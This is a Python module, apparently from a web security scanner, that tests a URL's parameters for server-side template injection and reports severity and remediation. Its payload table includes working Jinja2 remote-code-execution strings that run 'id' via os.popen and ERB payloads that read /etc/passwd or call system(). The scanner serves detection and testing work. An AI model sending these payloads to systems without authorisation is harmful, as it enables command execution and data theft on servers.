import urllib.parse
import re
from typing import Dict, List, Optional
from app.utils.http_client import fetch_url


def scan_ssti(scan_context: dict) -> dict:
    if not scan_context.get("url"):
        return {"error": "missing_url"}

    url = scan_context["url"]
    evidence = []
    is_vulnerable = False
    highest_confidence = 0.0
    detected_template = None

    ssti_payloads = {
        "jinja2": [
            ("{{7*7}}", "49", "jinja2"),
            ("{{config.items()}}", "config", "jinja2"),
            ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "uid", "jinja2_rce"),
            ("{{''.__class__.__mro__[2].__subclasses__()}}", "class", "jinja2"),
            ("{{request.__class__.__mro__[2].__subclasses__()}}", "request", "jinja2"),
            ("{{url_for.__globals__.os.popen('id').read()}}", "uid", "jinja2_rce"),
            ("{{lipsum.__globals__.os.popen('id').read()}}", "uid", "jinja2_rce"),
            ("{{namespace.__init__.__globals__}}", "globals", "jinja2"),
        ],
        "erb": [
            ("<%= 7*7 %>", "49", "erb"),
            ("<%= File.read('/etc/passwd') %>", "root:", "erb_rce"),
            ("<%= system('id') %>", "uid", "erb_rce"),
            ("<%= `id` %>", "uid", "erb_rce"),
            ("<%= Dir.entries('/') %>", "etc", "erb"),
        ],
        "template": [
            ("#{7*7}", "49", "ruby"),
            ("<# 7*7 #{7*7}#>", "49", "groovy"),
            ("${7*7}", "49", "freemarker"),
            ("@{7*7}", "49", "velocity"),
            ("{{7*7}}", "49", "handlebars"),
            ("*{7*7}*", "49", "thymeleaf"),
        ],
        "php": [
            ("<?php echo 7*7; ?>", "49", "php"),
            ("<?= 7*7 ?>", "49", "php_short"),
            ("<?php print_r(scandir('.')); ?>", ".php", "php"),
        ],
        "django": [
            ("{{7*7}}", "49", "django"),
            ("{{request.user}}", "Anonymous", "django"),
            ("{% debug %}", "debug", "django"),
            ("{% load static %}", "static", "django"),
        ],
        "razor": [
            ("@(7*7)", "49", "razor"),
            ("@* comment *@", "comment", "razor"),
        ],
    }

    all_payloads = [
        ("{{7*7}}", "49", "jinja2"),
        ("<%= 7*7 %>", "49", "erb"),
        ("#{7*7}", "49", "ruby"),
        ("${7*7}", "49", "freemarker"),
        ("@{7*7}", "49", "velocity"),
        ("<# 7*7 #>", "49", "freemarker"),
        ("<?php echo 7*7; ?>", "49", "php"),
        ("@(7*7)", "49", "razor"),
    ]

    try:
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)

        common_input_params = [
            'name', 'username', 'first_name', 'last_name', 'email', 'title',
            'content', 'body', 'description', 'search', 'q', 'query', 'template',
            'view', 'page', 'format', 'data', 'id', 'year', 'month', 'lang'
        ]

        test_params = list(params.keys())
        if not test_params:
            test_params = common_input_params[:5]

        for param_name in test_params:
            for payload, expected, template_type in all_payloads[:4]:
                test_params_dict = params.copy()
                test_params_dict[param_name] = [payload]

                new_query = urllib.parse.urlencode(test_params_dict, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                response = fetch_url(test_url)
                if response:
                    vuln_data, template = analyze_ssti_response(
                        response.text, payload, expected, param_name, test_url
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        detected_template = template
                        if highest_confidence >= 0.8:
                            is_vulnerable = True

                response = fetch_url(url, method="POST", data={param_name: payload})
                if response:
                    vuln_data, template = analyze_ssti_response(
                        response.text, payload, expected, param_name, url
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        detected_template = template
                        if highest_confidence >= 0.8:
                            is_vulnerable = True

        if detected_template:
            specific_payloads = ssti_payloads.get(detected_template, [])
            for payload, expected, ptype in specific_payloads[:4]:
                test_params_dict = {test_params[0]: [payload]}
                new_query = urllib.parse.urlencode(test_params_dict, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))

                response = fetch_url(test_url)
                if response:
                    vuln_data, _ = analyze_ssti_response(
                        response.text, payload, expected, test_params[0], test_url
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.8:
                            is_vulnerable = True

    except Exception as e:
        return {
            "vulnerability_type": "ssti",
            "is_vulnerable": False,
            "severity": "info",
            "confidence": 0.0,
            "evidence": [{"type": "error", "value": f"Scanner error: {str(e)}"}],
            "recommendation": "An error occurred during SSTI scanning."
        }

    severity = determine_severity(highest_confidence)

    return {
        "vulnerability_type": "ssti",
        "template_engine": detected_template,
        "is_vulnerable": is_vulnerable,
        "severity": severity,
        "confidence": highest_confidence,
        "evidence": evidence,
        "recommendation": get_ssti_recommendation(is_vulnerable, highest_confidence, detected_template)
    }


def analyze_ssti_response(response_text: str, payload: str, expected: str,
                         param_name: str, test_url: str) -> tuple:
    response_lower = response_text.lower()

    if expected in response_text and expected not in payload:
        template_type = identify_template(payload, response_text)
        return {
            "type": "ssti_detected",
            "parameter": param_name,
            "payload": payload,
            "test_url": test_url,
            "evidence": f"Template injection confirmed - computed value '{expected}' found",
            "confidence": 0.95
        }, template_type

    error_patterns = [
        (r"jinja2", "jinja2"),
        (r"template", "template"),
        (r"undefined error", "undefined"),
        (r"template.*not found", "template"),
        (r"can't.*attribute", "template"),
    ]

    for pattern, ptype in error_patterns:
        if re.search(pattern, response_lower):
            return {
                "type": "template_error",
                "parameter": param_name,
                "payload": payload,
                "test_url": test_url,
                "evidence": f"Template-related error detected ({ptype})",
                "confidence": 0.5
            }, ptype

    return None, None


def identify_template(payload: str, response: str) -> str:
    if "{{" in payload or "}}" in payload:
        if "jinja" in response.lower() or "django" in response.lower():
            return "jinja2"
        return "jinja2"
    elif "<%=" in payload or "%>" in payload:
        return "erb"
    elif "#{" in payload:
        return "ruby"
    elif "${" in payload:
        return "freemarker"
    elif "@(" in payload:
        return "razor"
    elif "<?php" in payload:
        return "php"
    return "unknown"


def determine_severity(confidence: float) -> str:
    if confidence >= 0.9:
        return "critical"
    elif confidence >= 0.7:
        return "high"
    elif confidence >= 0.5:
        return "medium"
    else:
        return "low"


def get_ssti_recommendation(is_vulnerable: bool, confidence: float, template: str = None) -> str:
    if not is_vulnerable:
        return "No Server-Side Template Injection detected. Continue following secure template practices."

    if confidence >= 0.9:
        template_info = f" (Template engine: {template})" if template else ""
        return (f"CRITICAL: Server-Side Template Injection confirmed{template_info}. "
                "This can lead to Remote Code Execution. "
                "Immediate action required: "
                "1. Never allow user input to be used in template rendering. "
                "2. Use sandboxed template engines. "
                "3. Implement strict input validation and allowlists. "
                "4. Disable dangerous template features. "
                "5. Use secure template inheritance mechanisms.")
    else:
        return ("Potential SSTI detected. "
                "Review template rendering, implement input validation, "
                "and use sandboxed template engines.")
